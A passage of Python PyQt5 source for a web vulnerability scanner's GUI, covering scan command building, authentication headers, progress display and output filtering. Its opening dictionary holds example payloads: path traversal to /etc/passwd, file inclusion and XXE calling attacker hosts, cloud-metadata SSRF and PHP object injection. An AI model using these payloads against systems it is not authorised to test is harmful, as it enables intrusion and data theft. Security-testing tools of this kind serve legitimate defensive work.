            "Local File Inclusion (lfi)": "💡 LFI Examples:\n../../../etc/passwd\n....//....//....//etc/passwd\n/etc/passwd\nphp://filter/convert.base64-encode/resource=index.php",
            "Remote File Inclusion (rfi)": "💡 RFI Examples:\nhttp://evil.com/shell.txt\nhttps://attacker.com/backdoor.php\nftp://malicious.com/payload.txt",
            "XML External Entity (xxe)": "💡 XXE Examples:\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">\n<!ENTITY % xxe SYSTEM \"file:///etc/hostname\">",
            "Server-Side Request Forgery (ssrf)": "💡 SSRF Examples:\nhttp://127.0.0.1\nhttp://localhost\nhttp://169.254.169.254/latest/meta-data/\nhttp://[::1]",
            "PHP Object Injection (php_object_injection)": "💡 PHP Object Injection Examples:\nO:8:\"stdClass\":0:{}\nO:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}\na:2:{i:0;s:4:\"test\";i:1;s:5:\"admin\";}"
        }

        example_text = examples.get(module_text, "Select a module to see specific payload examples.")
        self.payload_example_label.setText(example_text)

    def save_payloads_to_file(self):
        """Save custom payloads to a file"""
        filename, _ = QFileDialog.getSaveFileName(
            self, "Save Payloads File", "custom_payloads.txt", "Text Files (*.txt);;All Files (*)"
        )
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(self.custom_payloads_text.toPlainText())
                self.custom_payloads_file.setText(filename)
                show_information(self, "Success", f"Payloads saved to:\n{filename}", setting_key="info_payloads_saved")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to save payloads:\n{e}")

    def open_notifications_dialog(self):
        """Open the notifications configuration dialog"""
        from GUI.dialogs.notifications_dialog import NotificationsDialog
        dialog = NotificationsDialog(self)
        dialog.exec_()

    def reset_all_warnings(self):
        """Reset all 'do not show again' warnings"""
        from GUI.utils.message_box import reset_all_warnings
        reset_all_warnings()
        QMessageBox.information(self, "Warnings Reset", "All warning dialogs have been reset.\nThey will show again next time.")

    def on_auth_type_changed(self, auth_type):
        """Handle authentication type change - hide/show fields dynamically"""
        # Hide all fields first
        self.auth_username_label.hide()
        self.auth_username.hide()
        self.auth_password_label.hide()
        self.auth_password.hide()
        self.auth_token_label.hide()
        self.auth_token.hide()
        self.auth_header_name_label.hide()
        self.auth_header_name.hide()

        # Show only relevant fields based on auth type
        if auth_type in ["Basic Auth", "Digest Auth", "NTLM Auth"]:
            self.auth_username_label.show()
            self.auth_username.show()
            self.auth_password_label.show()
            self.auth_password.show()
        elif auth_type == "Bearer Token":
            self.auth_token_label.setText("Bearer Token:")
            self.auth_token.setPlaceholderText("Enter bearer token")
            self.auth_token_label.show()
            self.auth_token.show()
        elif auth_type == "API Key":
            self.auth_token_label.setText("API Key:")
            self.auth_token.setPlaceholderText("Enter API key value")
            self.auth_token_label.show()
            self.auth_token.show()
            self.auth_header_name.setPlaceholderText("e.g., X-API-Key")
            self.auth_header_name_label.show()
            self.auth_header_name.show()
        elif auth_type == "OAuth 2.0":
            self.auth_token_label.setText("OAuth Token:")
            self.auth_token.setPlaceholderText("Enter OAuth 2.0 token")
            self.auth_token_label.show()
            self.auth_token.show()
        elif auth_type == "Custom Header":
            self.auth_header_name.setPlaceholderText("e.g., X-Custom-Auth")
            self.auth_header_name_label.show()
            self.auth_header_name.show()
            self.auth_token_label.setText("Header Value:")
            self.auth_token.setPlaceholderText("Enter header value")
            self.auth_token_label.show()
            self.auth_token.show()

    def build_command(self):
        """Build the scanner command"""
        # Get parent directory (where main.py is)
        parent_dir = Path(__file__).parent.parent
        main_script = parent_dir / "main.py"

        command = [sys.executable, str(main_script)]

        # Check for API targets first (from API Testing tab)
        if hasattr(self, 'api_scan_targets') and self.api_scan_targets:
            # Write API targets to temp JSON file for full method/params/body support
            import tempfile
            import json
            temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json', encoding='utf-8')
            json.dump(self.api_scan_targets, temp_file, indent=2)
            temp_file.close()
            command.extend(["--api-targets-file", temp_file.name])
            # Store temp file path for cleanup later
            self._api_targets_temp_file = temp_file.name
            # Clear api_scan_targets after using
            self.api_scan_targets = None
        # Target file
        elif self.target_file_input.text():
            command.extend(["-f", self.target_file_input.text()])
        elif self.target_input.toPlainText().strip():
            # Get all targets from text area (comma-separated or newline-separated)
            targets_text = self.target_input.toPlainText().strip()
            # Split by newlines and/or commas, filter empty strings
            targets = [t.strip() for t in targets_text.replace('\n', ',').split(',') if t.strip()]

            # Auto-fix URLs missing scheme (http:// or https://)
            fixed_targets = []
            for target in targets:
                if not target.startswith(('http://', 'https://')):
                    fixed_target = f'https://{target}'
                    self.output_console.append(f"[*] Auto-fixed URL: '{target}' -> '{fixed_target}'")
                    fixed_targets.append(fixed_target)
                else:
                    fixed_targets.append(target)

            # Pass each target as separate argument: -t target1 target2 target3
            command.append("-t")
            command.extend(fixed_targets)
        else:
            return None

        # Modules
        if self.all_modules_cb.isChecked():
            command.append("--all")
        else:
            selected = [name for name, cb in self.module_checkboxes.items() if cb.isChecked()]
            if selected:
                command.extend(["-m", ",".join(selected)])

        # Settings
        command.extend(["--threads", str(self.threads_spin.value())])
        command.extend(["--timeout", str(self.timeout_spin.value())])
        command.extend(["--max-time", str(self.max_time_spin.value())])
        command.extend(["--format", self.format_combo.currentText()])
        command.append("--auto-report")
        command.append("-v")

        # Scan Mode flags
        if self.recon_only_cb.isChecked():
            command.append("--recon-only")
        if self.rotate_agent_cb.isChecked():
            command.append("--rotate-agent")
        if self.single_page_cb.isChecked():
            command.append("--single-page")
        if hasattr(self, 'fast_mode_cb') and self.fast_mode_cb.isChecked():
            command.append("--fast")
        if hasattr(self, 'profile_only_cb') and self.profile_only_cb.isChecked():
            command.append("--profile-only")

        # WAF Detection & Bypass
        if hasattr(self, 'waf_detect_cb') and self.waf_detect_cb.isChecked():
            command.append("--waf")
        if hasattr(self, 'waf_bypass_cb') and self.waf_bypass_cb.isChecked():
            command.append("--waf-mode")
        if hasattr(self, 'browser_mode_cb') and self.browser_mode_cb.isChecked():
            command.append("--browser")
        if hasattr(self, 'waf_detect_only_cb') and self.waf_detect_only_cb.isChecked():
            command.append("--waf-detect")

        # Subdomain Enumeration
        if hasattr(self, 'enum_subdomains_cb') and self.enum_subdomains_cb.isChecked():
            command.append("--enum-subdomains")
        if hasattr(self, 'scan_subdomains_cb') and self.scan_subdomains_cb.isChecked():
            command.append("--scan-subdomains")
        if hasattr(self, 'subdomain_takeover_cb') and self.subdomain_takeover_cb.isChecked():
            command.append("--subdomain-takeover")
        if hasattr(self, 'passive_subdomain_cb') and self.passive_subdomain_cb.isChecked():
            command.append("--subdomain-passive-only")
        if hasattr(self, 'subdomain_limit_spin'):
            command.extend(["--subdomain-limit", str(self.subdomain_limit_spin.value())])
        if hasattr(self, 'subdomain_wordlist_input') and self.subdomain_wordlist_input.text().strip():
            command.extend(["--subdomain-wordlist", self.subdomain_wordlist_input.text().strip()])

        # Exclusions
        if hasattr(self, 'exclude_paths_input') and self.exclude_paths_input.text().strip():
            command.extend(["--exclude", self.exclude_paths_input.text().strip()])
        if hasattr(self, 'exclude_ips_input') and self.exclude_ips_input.text().strip():
            command.extend(["--exclude-ips", self.exclude_ips_input.text().strip()])
        if hasattr(self, 'exclude_subdomains_input') and self.exclude_subdomains_input.text().strip():
            command.extend(["--exclude-subdomains", self.exclude_subdomains_input.text().strip()])

        # Payload limit
        if hasattr(self, 'payload_limit_spin'):
            command.extend(["--payload-limit", str(self.payload_limit_spin.value())])

        # Authentication - add as custom headers
        auth_type = self.auth_type_combo.currentText()
        auth_headers = []

        if auth_type == "Basic Auth":
            if self.auth_username.text() and self.auth_password.text():
                import base64
                credentials = f"{self.auth_username.text()}:{self.auth_password.text()}"
                b64_credentials = base64.b64encode(credentials.encode()).decode()
                auth_headers.append(f"Authorization: Basic {b64_credentials}")

        elif auth_type == "Bearer Token":
            if self.auth_token.text():
                auth_headers.append(f"Authorization: Bearer {self.auth_token.text()}")

        elif auth_type == "API Key":
            if self.auth_token.text() and self.auth_header_name.text():
                auth_headers.append(f"{self.auth_header_name.text()}: {self.auth_token.text()}")

        elif auth_type == "OAuth 2.0":
            if self.auth_token.text():
                auth_headers.append(f"Authorization: Bearer {self.auth_token.text()}")

        elif auth_type == "Custom Header":
            if self.auth_token.text() and self.auth_header_name.text():
                auth_headers.append(f"{self.auth_header_name.text()}: {self.auth_token.text()}")

        # Add authentication headers to custom headers
        if auth_headers:
            existing_headers = self.headers_input.toPlainText()
            if existing_headers:
                all_headers = existing_headers + "\n" + "\n".join(auth_headers)
            else:
                all_headers = "\n".join(auth_headers)
            # Will be handled by custom headers processing below

        # HTTP config
        if self.cookies_input.text():
            command.extend(["-c", self.cookies_input.text()])

        # Custom headers (including auth headers)
        headers_text = self.headers_input.toPlainText()
        if auth_headers:
            if headers_text:
                headers_text += "\n" + "\n".join(auth_headers)
            else:
                headers_text = "\n".join(auth_headers)

        if headers_text.strip():
            # Convert headers to command format (Header:Value pairs)
            for line in headers_text.strip().split('\n'):
                if ':' in line:
                    command.extend(["-H", line.strip()])

        # Crawler
        command.extend(["--max-crawl-pages", str(self.max_crawl_spin.value())])

        # Custom payloads - will be set in start_scan if text payloads are provided
        # Otherwise use file path if specified
        if self.custom_payloads_file.text() and not self.custom_payloads_text.toPlainText().strip():
            command.extend(["--custom-payloads", self.custom_payloads_file.text()])

        return command

    def show_scan_wizard(self):
        """Show the scan wizard dialog"""
        wizard = ScanWizard(self)
        wizard.scan_configured.connect(self.apply_wizard_config)
        wizard.exec_()

    def apply_wizard_config(self, config):
        """Apply configuration from scan wizard and start scan automatically"""
        # Set target
        if config.get('target'):
            self.target_input.setPlainText(config['target'])

        # Set modules based on scan type and selection
        if config.get('modules'):
            # Uncheck "All Modules" to enable individual selection
            self.all_modules_cb.setChecked(False)

            # Set individual module checkboxes
            for module_key, checkbox in self.module_checkboxes.items():
                checkbox.setChecked(module_key in config['modules'])

        # Set performance settings
        if config.get('threads'):
            self.threads_spin.setValue(config['threads'])
        if config.get('timeout'):
            self.timeout_spin.setValue(config['timeout'])
        if config.get('max_time'):
            self.max_time_spin.setValue(config['max_time'])

        # Set output format
        if config.get('format'):
            format_map = {
                'html': 'html',
                'json': 'json',
                'txt': 'txt',
                'all formats': 'html,json,txt'
            }
            format_text = format_map.get(config['format'], 'html,json,txt')
            index = self.format_combo.findText(format_text)
            if index >= 0:
                self.format_combo.setCurrentIndex(index)

        # Set custom headers (FIXED: Was missing)
        if config.get('custom_headers'):
            headers_text = '\n'.join([f"{k}: {v}" for k, v in config['custom_headers'].items()])
            self.headers_input.setPlainText(headers_text)

        # Set cookies (FIXED: Was missing)
        if config.get('cookies'):
            self.cookies_input.setText(config['cookies'])

        # Set authentication (FIXED: Was missing)
        if config.get('auth_type'):
            auth_type = config['auth_type']
            # Map wizard auth type to Advanced tab auth combo
            auth_map = {
                'None': 0,
                'Basic Auth': 1,
                'Bearer Token': 2,
                'API Key': 3,
                'OAuth 2.0': 4,
                'Custom Header': 5
            }
            auth_index = auth_map.get(auth_type, 0)
            if hasattr(self, 'auth_combo'):
                self.auth_combo.setCurrentIndex(auth_index)

            # Set auth credentials
            if config.get('auth_username') and hasattr(self, 'auth_username_input'):
                self.auth_username_input.setText(config['auth_username'])
            if config.get('auth_password') and hasattr(self, 'auth_password_input'):
                self.auth_password_input.setText(config['auth_password'])

        # Switch to Results/Findings tab (index 2 based on start_scan method)
        results_tab_index = 2
        for i in range(self.tabs.count()):
            tab_text = self.tabs.tabText(i).lower()
            if 'result' in tab_text or 'finding' in tab_text:
                results_tab_index = i
                break
        self.tabs.setCurrentIndex(results_tab_index)

        # Update status to show we're starting
        self.statusBar().showMessage("Starting scan from wizard...")

        # Process events to update UI before starting scan
        from PyQt5.QtWidgets import QApplication
        QApplication.processEvents()

        # Start scan automatically after a short delay (gives UI time to update)
        from PyQt5.QtCore import QTimer
        QTimer.singleShot(200, self.start_scan)

    def start_scan(self):
        """Start the vulnerability scan"""
        # Debug logging helper
        def debug_log(msg):
            """Log debug messages to file and console"""
            from datetime import datetime
            timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            log_msg = f"[DEBUG {timestamp}] {msg}"
            print(log_msg)
            try:
                log_file = Path(__file__).parent.parent / "gui_debug.log"
                with open(log_file, 'a', encoding='utf-8') as f:
                    f.write(f"{log_msg}\n")
            except:
                pass

        debug_log("start_scan() called")

        try:
            debug_log("Building command...")
            command = self.build_command()
            if not command:
                self.output_console.append("[!] ERROR: Please specify a target URL or file")
                self.statusBar().showMessage("Error: No target specified", 5000)
                from PyQt5.QtWidgets import QMessageBox
                QMessageBox.warning(self, "No Target", "Please specify a target URL or file before starting the scan.")
                return
            debug_log(f"Command built: {' '.join(command[:5])}...")
        except Exception as e:
            debug_log(f"ERROR building command: {e}")
            self.output_console.append(f"[!] ERROR building command: {str(e)}")
            self.statusBar().showMessage(f"Error: {str(e)}", 5000)
            from PyQt5.QtWidgets import QMessageBox
            QMessageBox.critical(self, "Error", f"Failed to build scan command:\n\n{str(e)}")
            import traceback
            traceback.print_exc()
            return

        # Handle custom payloads entered directly in text area
        try:
            debug_log("Processing custom payloads...")
            payloads_text = self.custom_payloads_text.toPlainText().strip()
            temp_payload_file = None

            if payloads_text:
                # Create temporary file with custom payloads
                import tempfile
                try:
                    temp_payload_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt', encoding='utf-8')
                    temp_payload_file.write(payloads_text)
                    temp_payload_file.close()

                    # Add to command
                    command.extend(["--custom-payloads", temp_payload_file.name])
                    self.output_console.append(f"[*] Using {len(payloads_text.split(chr(10)))} custom payloads from text editor\n")
                except Exception as e:
                    self.output_console.append(f"[!] Error creating temporary payloads file: {e}\n")
                    if temp_payload_file:
                        temp_payload_file.close()
                    return

            # Update UI - batch updates to reduce lag
            debug_log("Updating UI buttons...")
            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            self.pause_btn.setEnabled(True)
            self.statusBar().showMessage("Initializing scan...")
            self.progress_bar.setValue(0)
            self.current_module_label.setText("Initializing scan...")

            # Process events to keep UI responsive
            QApplication.processEvents()

            # Clear output console
            debug_log("Clearing output console...")
            self.output_console.clear()
            self.output_console.append(f"[*] Starting scan...")

            # Reset vulnerability counters and list
            debug_log("Resetting vuln counters...")
            self.vuln_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
            self.results_handler.update_vuln_display()
            debug_log("Clearing vulns_list...")
            self.vulns_list.clear()
            # Reset results tab color
            debug_log("Resetting tab color...")
            self.tabs.tabBar().setTabTextColor(self.TAB_RESULTS, QColor('white'))

            # Process events before clearing tables
            QApplication.processEvents()

            # Clear tables with updates suspended for performance
            debug_log("Clearing resource tables...")
            for table in [self.social_media_table, self.emails_table, self.phones_table,
                         self.leaked_keys_table, self.scope_table, self.tech_table, self.geo_table]:
                table.setUpdatesEnabled(False)
                table.setRowCount(0)
                table.setUpdatesEnabled(True)

            # Clear main results table
            debug_log("Clearing results table...")
            if hasattr(self, 'results_table'):
                self.results_table.setUpdatesEnabled(False)
                self.results_table.setRowCount(0)
                self.results_table.setUpdatesEnabled(True)

            # Clear resources table
            if hasattr(self, 'resources_table'):
                self.resources_table.setUpdatesEnabled(False)
                self.resources_table.setRowCount(0)
                self.resources_table.setUpdatesEnabled(True)

            # Reset stats cards
            debug_log("Resetting stats cards...")
            if hasattr(self, 'total_card'):
                self.total_card.set_value(0)
            if hasattr(self, 'critical_card'):
                self.critical_card.set_value(0)
            if hasattr(self, 'high_card'):
                self.high_card.set_value(0)
            if hasattr(self, 'medium_card'):
                self.medium_card.set_value(0)
            if hasattr(self, 'low_card'):
                self.low_card.set_value(0)
            if hasattr(self, 'pie_chart'):
                self.pie_chart.set_data({'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0})

            # Clear timeline data
            if hasattr(self, '_timeline_data'):
                self._timeline_data = []
            if hasattr(self, 'timeline_chart'):
                self.timeline_chart.set_data([])

            # Reset findings count label
            if hasattr(self, 'findings_count_label'):
                self.findings_count_label.setText("(0)")

            # Clear filters (reset to "All")
            debug_log("Resetting filters...")
            if hasattr(self, 'module_filter'):
                self.module_filter.clear()
                self.module_filter.addItem("All")
            if hasattr(self, 'target_filter'):
                self.target_filter.clear()
                self.target_filter.addItem("All")
            if hasattr(self, 'status_filter'):
                self.status_filter.setCurrentIndex(0)
            if hasattr(self, 'extension_filter'):
                self.extension_filter.setCurrentIndex(0)
            if hasattr(self, 'severity_filter'):
                self.severity_filter.setCurrentIndex(0)

            # Clear target profile
            debug_log("Clearing target profile...")
            if hasattr(self, 'target_profile_panel'):
                self.target_profile_panel.clear()
            if hasattr(self, 'current_target_profile'):
                self.current_target_profile = None

            # Clear site tree
            debug_log("Clearing site tree...")
            if hasattr(self, 'site_tree'):
                self.site_tree.clear()
            if hasattr(self, 'site_tree_nodes'):
                self.site_tree_nodes = {}

            # Initialize Progress & Plan tab
            debug_log("Initializing progress tab...")
            import datetime
            self.scan_start_time = datetime.datetime.now()
            self.scan_start_label.setText(self.scan_start_time.strftime("%Y-%m-%d %H:%M:%S"))
            self.time_update_timer.start(1000)  # Update every second

            # Process events before heavy operations
            QApplication.processEvents()

            # Populate scan plan based on selected modules
            debug_log("Populating scan plan...")
            self.populate_scan_plan(command)

            # Show command in output (after initialization)
            if self.debug_mode:
                self.output_console.append(f"[*] Command: {' '.join(command)}\n")

            self.statusBar().showMessage("Scan running...")

            # Get max_time for time remaining calculation
            max_time_minutes = self.max_time_spin.value() if hasattr(self, 'max_time_spin') else 0

            # Start scan thread with max_time for time tracking
            debug_log("Creating ScanThread...")
            self.scan_thread = ScanThread(command, max_time=max_time_minutes)
            debug_log("Connecting signals...")
            self.scan_thread.output_signal.connect(self.append_output)
            self.scan_thread.finished_signal.connect(self.scan_finished)
            self.scan_thread.progress_signal.connect(self.update_progress)
            self.scan_thread.vulnerability_signal.connect(self.results_handler.add_vulnerability)
            self.scan_thread.vulnerability_data_signal.connect(self.results_handler.add_vulnerability_with_data)
            self.scan_thread.stats_signal.connect(self.results_handler.update_stats)
            self.scan_thread.resource_signal.connect(self.results_handler.add_resource)
            self.scan_thread.scope_signal.connect(self.results_handler.add_scope_info)
            self.scan_thread.report_signal.connect(self.results_handler.set_current_report)
            self.scan_thread.time_signal.connect(self.update_time_display)
            self.scan_thread.profile_signal.connect(self.update_target_profile)
            debug_log("Starting scan thread...")
            self.scan_thread.start()
            debug_log("Scan thread started successfully!")

            # Switch to Results tab to show progress and findings
            self.tabs.setCurrentIndex(self.TAB_RESULTS)

        except Exception as e:
            debug_log(f"EXCEPTION in start_scan: {type(e).__name__}: {e}")
            import traceback
            debug_log(f"Traceback:\n{traceback.format_exc()}")
            self.output_console.append(f"[!] ERROR starting scan: {str(e)}")
            self.statusBar().showMessage(f"Error: {str(e)}", 5000)
            from PyQt5.QtWidgets import QMessageBox
            QMessageBox.critical(self, "Scan Error", f"Failed to start scan:\n\n{str(e)}")
            import traceback
            traceback.print_exc()
            # Re-enable start button
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self.pause_btn.setEnabled(False)

    def stop_scan(self):
        """Stop the running scan"""
        if self.scan_thread:
            self.scan_thread.stop()
            self.output_console.append("\n[!] Scan stopped by user")
            self.scan_finished(-1)

    def toggle_pause_scan(self):
        """Toggle pause/resume for the running scan"""
        if self.scan_thread:
            if hasattr(self.scan_thread, 'paused') and self.scan_thread.paused:
                # Resume
                self.scan_thread.resume()
                self.pause_btn.setText("Pause")
                self.pause_btn.setStyleSheet("""
                    QPushButton {
                        background-color: #FF9800;
                        color: white;
                        font-size: 12px;
                        font-weight: bold;
                        padding: 8px 16px;
                        border-radius: 4px;
                        border: none;
                    }
                    QPushButton:hover {
                        background-color: #F57C00;
                    }
                """)
                self.output_console.append("\n[>] Scan resumed")
                self.statusBar().showMessage("Scan resumed")
            else:
                # Pause
                self.scan_thread.pause()
                self.pause_btn.setText("Resume")
                self.pause_btn.setStyleSheet("""
                    QPushButton {
                        background-color: #2196F3;
                        color: white;
                        font-size: 12px;
                        font-weight: bold;
                        padding: 8px 16px;
                        border-radius: 4px;
                        border: none;
                    }
                    QPushButton:hover {
                        background-color: #1976D2;
                    }
                """)
                self.output_console.append("\n[||] Scan paused")
                self.statusBar().showMessage("Scan paused")

    def toggle_debug_mode(self, checked):
        """Toggle debug mode on/off"""
        self.debug_mode = checked
        status = "enabled" if checked else "disabled"
        self.statusBar().showMessage(f"Debug mode {status}", 3000)
        if checked:
            self.output_console.append(f"[*] Debug mode enabled - verbose output will be shown")
        else:
            self.output_console.append(f"[*] Debug mode disabled - only important messages shown")

    def append_output(self, text):
        """Append text to output console with throttling to reduce UI lag"""
        try:
            import re
            import time

            # Check if output logging is enabled
            if hasattr(self, 'output_enabled_cb') and not self.output_enabled_cb.isChecked():
                return  # Skip logging if disabled

            # Strip ANSI color codes for clean display
            text_clean = re.sub(r'\x1b\[[0-9;]*m', '', text)
            # Also strip any remaining [XXm patterns (colorama on Windows)
            text_clean = re.sub(r'\[([0-9]{1,2}(;[0-9]{1,2})?)?m', '', text_clean)

            # RAW OUTPUT MODE - bypass all filtering when enabled
            if not self.raw_output_mode:
                # Filter out noisy debug/error messages from OOB detection
                skip_patterns = [
                    'Error checking Pipedream:',
                    'Error checking Requestbin:',
                    'Max retries exceeded',
                    'Read timed out',
                    'SSL: UNEXPECTED_EOF_WHILE_READING',
                    'SSLError',
                    'SSLEOFError'
                ]

                # Skip line if it contains any of the noisy patterns
                if any(pattern in text_clean for pattern in skip_patterns):
                    return

                # Debug mode filtering - skip ONLY truly verbose/noisy messages when debug is off
                # Important messages (vulnerabilities, module status, results) always show
                if not self.debug_mode:
                    # Only filter out actual debug/trace messages, not important scan output
                    verbose_patterns = [
                        '[DEBUG]', '[VERBOSE]', '[TRACE]',
                        'Parsed parameters:', 'Parameters:',
                        'Testing parameter:', 'Checking URL:',
                        'Request headers:', 'Response headers:',
                        'DEBUG -', 'TRACE -',
                    ]
                    # Check if it's a verbose message but NOT an important one
                    is_verbose = any(pattern in text_clean for pattern in verbose_patterns)
                    # Important patterns that should ALWAYS show
                    important_patterns = [
                        'Running module:', 'Module', 'completed:',
                        'VULNERABILITY', 'vulnerability', 'FOUND', 'Found:',
                        '[CRITICAL]', '[HIGH]', '[MEDIUM]', '[LOW]',
                        'XSS', 'SQLi', 'SQL Injection', 'CSRF', 'SSRF', 'LFI', 'RFI',
                        'Target:', 'Scan', 'Error:', 'Warning:', 'ERROR',
                        'Total vulnerabilities', 'findings',
                        'Failed', 'failed', 'Connection', 'Timeout', 'timeout',
                        'unreachable', 'refused', 'not found', 'invalid',
                        'Exception', 'exception', 'Cannot', 'cannot',
                        'Page discovery', 'Crawling', 'requests',
                    ]
                    is_important = any(pattern in text_clean for pattern in important_patterns)
                    if is_verbose and not is_important:
                        return

            # Add to buffer for throttled display
            self._output_buffer.append(text_clean)

            # Check if we should flush now
            current_time = time.time() * 1000  # ms
            time_since_last = current_time - self._last_output_time

            if time_since_last >= self._output_throttle_ms:
                # Flush immediately
                self._flush_output_buffer()
            else:
                # Schedule a delayed flush if not already scheduled
                if self._output_flush_timer is None:
                    remaining = self._output_throttle_ms - time_since_last
                    self._output_flush_timer = QTimer.singleShot(int(remaining), self._flush_output_buffer)
        except Exception as e:
            # Log error to debug file
            from datetime import datetime
            log_file = Path(__file__).parent.parent / "gui_debug.log"
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%H:%M:%S')}] ERROR in append_output: {e}\n")
                import traceback
                f.write(traceback.format_exc() + "\n")

    def _flush_output_buffer(self):
        """Flush buffered output to console and combined output table"""
        try:
            import time

            self._output_flush_timer = None

            if not self._output_buffer:
                return

            # Process each line for the combined output table
            for line in self._output_buffer:
                if hasattr(self, 'results_tab_builder') and hasattr(self.results_tab_builder, 'add_scan_output_line'):
                    self.results_tab_builder.add_scan_output_line(line)

            # Batch update - join all buffered lines for main console
            batch_text = '\n'.join(self._output_buffer)
            self._output_buffer.clear()

            # Update main output console
            self.output_console.append(batch_text)
            self.output_console.moveCursor(QTextCursor.End)

            self._last_output_time = time.time() * 1000
        except Exception as e:
            # Log error to debug file
            from datetime import datetime
            log_file = Path(__file__).parent.parent / "gui_debug.log"
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%H:%M:%S')}] ERROR in _flush_output_buffer: {e}\n")
                import traceback
                f.write(traceback.format_exc() + "\n")

    def update_progress(self, value, message):
        """Update progress bar and status"""
        try:
            if value > 0:
                self.progress_bar.setValue(value)
                # Also update the combined output tab progress bar
                if hasattr(self, 'output_progress_bar'):
                    self.output_progress_bar.setValue(value)
            self.current_module_label.setText(message)

            # Also update the combined output tab current module label
            if hasattr(self, 'output_current_module'):
                self.output_current_module.setText(message)

            # Update the new progress tab builder if available
            if hasattr(self, 'progress_tab_builder'):
                # Update dashboard
                self.progress_tab_builder.update_dashboard_stats(
                    current_module=message,
                    vulns=sum(self.vuln_counts.values()) if hasattr(self, 'vuln_counts') else 0
                )

                # Add activity log and update module cards
                # Handle "Running: ModuleName" messages from scan thread
                if message.startswith("Running:"):
                    module_name = message.replace("Running:", "").strip()
                    self.progress_tab_builder.add_activity_log(f"Started: {module_name}", "info")
                    self.progress_tab_builder.update_module_status(module_name, "running", progress=0)
                    # Track last running module for completion marking
                    self._last_running_module = module_name

                # Handle "Completed X/Y modules" messages
                elif "Completed" in message and "/" in message:
                    import re
                    match = re.search(r'Completed\s*(\d+)/(\d+)', message)
                    if match:
                        completed = int(match.group(1))
                        total = int(match.group(2))
                        # Mark last running module as complete
                        if hasattr(self, '_last_running_module') and self._last_running_module:
                            self.progress_tab_builder.update_module_status(
                                self._last_running_module, "complete", progress=100
                            )
                    self.progress_tab_builder.add_activity_log(message, "success")

                # Handle legacy patterns
                elif "Testing:" in message or "Running module:" in message:
                    module_name = message.replace("Testing:", "").replace("Running module:", "").strip()
                    self.progress_tab_builder.add_activity_log(f"Started: {module_name}", "info")
                    self.progress_tab_builder.update_module_status(module_name, "running")
                    self._last_running_module = module_name

                elif "Crawling" in message:
                    self.progress_tab_builder.add_activity_log(message, "info")

                elif "Scanning:" in message:
                    self.progress_tab_builder.add_activity_log(message, "info")

        except Exception as e:
            # Log error to debug file
            from datetime import datetime
            log_file = Path(__file__).parent.parent / "gui_debug.log"
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%H:%M:%S')}] ERROR in update_progress: {e}\n")
                import traceback
                f.write(traceback.format_exc() + "\n")

    def update_time_display(self, elapsed_seconds, remaining_seconds):
        """Update time elapsed and remaining display"""
        try:
            def format_time(seconds):
                """Format seconds into MM:SS or HH:MM:SS"""
                if seconds < 0:
                    return "∞"
                hours = seconds // 3600
                minutes = (seconds % 3600) // 60
                secs = seconds % 60
                if hours > 0:
                    return f"{hours}:{minutes:02d}:{secs:02d}"
                return f"{minutes:02d}:{secs:02d}"

            elapsed_str = format_time(elapsed_seconds)
            remaining_str = format_time(remaining_seconds)

            # Update time label (if exists)
            if hasattr(self, 'time_elapsed_label'):
                self.time_elapsed_label.setText(f"⏱️ Elapsed: {elapsed_str}")

            # Update combined output tab time elapsed
            if hasattr(self, 'output_time_elapsed'):
                self.output_time_elapsed.setText(f"Elapsed: {elapsed_str}")

            if hasattr(self, 'time_remaining_label'):
                if remaining_seconds < 0:
                    self.time_remaining_label.setText("⏳ Time Left: Unlimited")
                elif remaining_seconds == 0:
                    self.time_remaining_label.setText("⏳ Time Left: 00:00 (limit reached)")
                    self.time_remaining_label.setStyleSheet("color: #ef4444; font-weight: bold;")
                else:
                    self.time_remaining_label.setText(f"⏳ Time Left: {remaining_str}")
                    # Change color when less than 1 minute remaining
                    if remaining_seconds < 60:
                        self.time_remaining_label.setStyleSheet("color: #f97316; font-weight: bold;")
                    elif remaining_seconds < 300:
                        self.time_remaining_label.setStyleSheet("color: #eab308;")
                    else:
                        self.time_remaining_label.setStyleSheet("color: #22c55e;")

            # Update combined output tab time remaining
            if hasattr(self, 'output_time_remaining'):
                if remaining_seconds < 0:
                    self.output_time_remaining.setText("Remaining: Unlimited")
                elif remaining_seconds == 0:
                    self.output_time_remaining.setText("Remaining: 00:00")
                else:
                    self.output_time_remaining.setText(f"Remaining: {remaining_str}")
        except Exception as e:
            # Log error to debug file
            from datetime import datetime
            log_file = Path(__file__).parent.parent / "gui_debug.log"
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%H:%M:%S')}] ERROR in update_time_display: {e}\n")
                import traceback
                f.write(traceback.format_exc() + "\n")

    def update_target_profile(self, profile_data):
        """Update target profile panel with new profile data"""
        try:
            if hasattr(self, 'results_tab_builder') and hasattr(self.results_tab_builder, 'update_target_profile'):
                self.results_tab_builder.update_target_profile(profile_data)
                self.output_console.append("[+] Target profile updated")
            elif hasattr(self, 'target_profile_panel'):
                self.target_profile_panel.update_profile(profile_data)
                self.output_console.append("[+] Target profile updated")
        except Exception as e:
            # Log error to debug file
            from datetime import datetime
            log_file = Path(__file__).parent.parent / "gui_debug.log"
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%H:%M:%S')}] ERROR in update_target_profile: {e}\n")
                import traceback
                f.write(traceback.format_exc() + "\n")

    def _update_scan_time(self):
        """Update scan time display from timer (fallback if scan_thread doesn't emit)"""
        if not hasattr(self, 'scan_start_time') or not self.scan_start_time:
            return

        import datetime
        elapsed = (datetime.datetime.now() - self.scan_start_time).total_seconds()
